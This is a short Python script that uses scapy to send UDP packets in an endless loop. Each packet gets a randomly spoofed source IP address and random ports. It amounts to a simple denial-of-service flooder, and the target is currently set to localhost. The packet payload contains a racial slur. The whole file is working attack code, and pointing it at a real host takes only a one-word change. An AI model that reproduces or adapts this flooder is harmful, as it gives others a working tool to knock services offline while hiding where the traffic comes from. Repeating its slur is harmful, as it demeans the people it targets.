from scapy.all import IP, UDP, send
import random

target = "127.0.0.1"

while True:
    source_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    src_port = random.randint(0, 65535)
    dst_port = random.randint(0, 65535)
    payload = b"MEOW! MEOW! NIGGA WHATS UP?"
    packet = IP(src=source_ip, dst=target) / UDP(sport=src_port, dport=dst_port) / payload
    send(packet, verbose=0)
